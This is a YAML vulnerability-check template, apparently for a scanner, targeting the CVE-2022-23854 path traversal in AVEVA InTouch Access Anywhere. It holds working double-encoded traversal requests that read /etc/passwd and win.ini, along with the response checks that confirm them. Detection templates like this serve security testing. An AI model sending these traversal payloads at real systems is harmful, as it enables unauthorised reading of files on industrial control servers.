name: yaml-poc-aveva-intouch_access_anywhere-directory_traversal-CVE-2022-23854
binding: 4b7ee4bf-aaf0-4cdb-8c2a-88f6bac6dc5b
detail:
    author: luhan.xu
    links:
        - https://packetstormsecurity.com/files/168328/InTouch-Access-Anywhere-Secure-Gateway-2020-R2-Path-Traversal.html
        - https://www.cisa.gov/uscert/ics/advisories/icsa-22-342-02
    vulnerability:
        id: 23ba3d37-2197-4188-881e-50adca59effc
        level: high
    warning: Harmless
transport: http
rules:
    check:
        request:
            cache: true
            method: GET
            path: /AccessAnywhere/start.html
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("InTouch Access Anywhere")
    linux0:
        request:
            cache: true
            method: GET
            path: /AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    windows0:
        request:
            cache: true
            method: GET
            path: /AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
            follow_redirects: false
        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
expression: check() && (windows0() || linux0())
